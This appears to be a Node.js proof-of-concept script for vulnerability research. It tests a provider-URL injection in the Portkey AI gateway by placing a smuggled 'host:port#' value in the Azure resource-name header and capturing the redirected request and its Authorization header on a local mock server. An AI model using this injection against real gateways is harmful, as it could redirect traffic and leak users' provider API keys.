import https from "node:https";
import { spawn } from "node:child_process";
import { mkdir, writeFile } from "node:fs/promises";
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const packageDir = path.join(__dirname, "package");
const gatewayPort = 8787;
const mockPort = 18443;
const gatewayBase = `http://127.0.0.1:${gatewayPort}`;
const requests = [];

const pfxPath = path.join(tmpdir(), "portkey-local-test.pfx");

function startTlsMock() {
  const server = https.createServer({ pfx: readFileSync(pfxPath), passphrase: process.env.PORTKEY_LOCAL_CERT_PASSWORD || "portkey-test" }, async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    requests.push({ method: req.method, url: req.url, headers: req.headers, body: Buffer.concat(chunks).toString("utf8") });
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ id: "url-injection-local", choices: [{ message: { role: "assistant", content: "ok" } }] }));
  });
  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(mockPort, "127.0.0.1", () => resolve(server));
  });
}

function startGateway() {
  const env = {
    ...process.env,
    NODE_ENV: "production",
    NODE_TLS_REJECT_UNAUTHORIZED: "0",
    NO_PROXY: "127.0.0.1,localhost",
    TRUSTED_CUSTOM_HOSTS: "allowed.example.com",
  };
  const child = spawn(process.execPath, [path.join(packageDir, "build", "start-server.js"), `--port=${gatewayPort}`, "--headless"], {
    cwd: packageDir,
    env,
    stdio: ["ignore", "pipe", "pipe"],
  });
  const logs = [];
  child.stdout.on("data", (data) => logs.push(data.toString()));
  child.stderr.on("data", (data) => logs.push(data.toString()));
  return { child, logs };
}

async function waitForGateway(logs) {
  const deadline = Date.now() + 20000;
  while (Date.now() < deadline) {
    try {
      const response = await fetch(`${gatewayBase}/`, { signal: AbortSignal.timeout(1000) });
      if (response.ok) return;
    } catch {}
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  throw new Error(`Gateway did not become ready\n${logs.join("")}`);
}

async function call(resourceName) {
  requests.length = 0;
  const response = await fetch(`${gatewayBase}/v1/chat/completions`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: "Bearer sk-local-provider-url",
      "x-portkey-provider": "azure-openai",
      "x-portkey-azure-resource-name": resourceName,
      "x-portkey-azure-deployment-id": "gpt-4o-mini",
      "x-portkey-azure-api-version": "2024-01-01",
    },
    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: "local probe" }] }),
    signal: AbortSignal.timeout(10000),
  });
  return { status: response.status, body: await response.text(), requests: [...requests] };
}

let mock;
let gateway;
try {
  mock = await startTlsMock();
  gateway = startGateway();
  await waitForGateway(gateway.logs);
  const results = {
    control: await call("127.0.0.1"),
    fragment_candidate: await call(`127.0.0.1:${mockPort}#`),
  };
  const outputDir = path.join(__dirname, "..", "evidence");
  await mkdir(outputDir, { recursive: true });
  const resultPath = path.join(outputDir, `provider-url-injection-${Date.now()}.json`);
  await writeFile(resultPath, JSON.stringify({ generatedAt: new Date().toISOString(), package: "@portkey-ai/gateway@1.15.2", results, gatewayLogs: gateway.logs.join("").slice(-6000) }, null, 2));
  console.log(JSON.stringify({ resultPath, summary: Object.fromEntries(Object.entries(results).map(([name, value]) => [name, { status: value.status, mockRequestCount: value.requests.length, firstMockUrl: value.requests[0]?.url, firstMockAuthorization: value.requests[0]?.headers?.authorization }])) }, null, 2));
} finally {
  if (gateway?.child && !gateway.child.killed) gateway.child.kill();
  if (mock) await new Promise((resolve) => mock.close(resolve));
}
